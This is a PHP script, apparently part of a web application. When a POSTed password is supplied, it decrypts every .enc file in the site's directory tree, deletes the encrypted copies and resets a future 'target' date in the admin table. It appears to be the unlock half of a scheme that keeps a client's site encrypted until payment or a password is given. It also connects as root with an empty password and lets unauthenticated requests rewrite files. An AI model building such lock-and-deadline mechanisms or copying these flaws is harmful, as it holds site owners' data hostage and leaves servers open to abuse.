<?php

function decrypt_page($encrypted_content, $password) {
    $ciphertext = base64_decode($encrypted_content);
    $ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");
    $iv = substr($ciphertext, 0, $ivlen);
    $hmac = substr($ciphertext, $ivlen, $sha2len=32);
    $ciphertext_raw = substr($ciphertext, $ivlen + $sha2len);

    $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $password, $options=OPENSSL_RAW_DATA, $iv);
    $calcmac = hash_hmac('sha256', $ciphertext_raw, $password, $as_binary=true);
    if (hash_equals($hmac, $calcmac)) {
        return $original_plaintext;
    } else {
        throw new Exception('Decryption failed: HMAC verification failed might be due to wrong password');
    }
}

function decrypt_and_save($encrypted_file_path, $password, $conn) {
    $encrypted_content = file_get_contents($encrypted_file_path);
    $decrypted_content = decrypt_page($encrypted_content, $password);

    $original_file_path = str_replace('.enc', '', $encrypted_file_path);
    file_put_contents($original_file_path, $decrypted_content);
    unlink($encrypted_file_path);
    
    // Insert date now plus 10 days to target in admin table where admin_id is not null
    $date_plus_10_days = date('Y-m-d H:i:s', strtotime('+10 days'));
    $date_plus_5_months = date('Y-m-d H:i:s', strtotime('+5 months', strtotime($date_plus_10_days)));
    $sql = "UPDATE admin SET target = ? WHERE admin_id IS NOT NULL";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("s", $date_plus_5_months);
    $stmt->execute();
}

// Database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "tueogan";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Usage example (for testing)
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    
    $directory = '.'; // Starting directory
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));
    $enc_files = new RegexIterator($iterator, '/^.+\.enc$/i', RecursiveRegexIterator::GET_MATCH);

    try {
        foreach ($enc_files as $file) {
            $enc_file = $file[0]; // Get the file path from the match
            decrypt_and_save($enc_file, $password, $conn);
        }

        echo '<script>alert("Thank you, you may now use the system."); window.location.href = "home-page.php";</script>';
    } catch (Exception $e) {
        die('Error: ' . $e->getMessage());
    }
} else {
    echo 'Password not provided.';
}

$conn->close();
?>
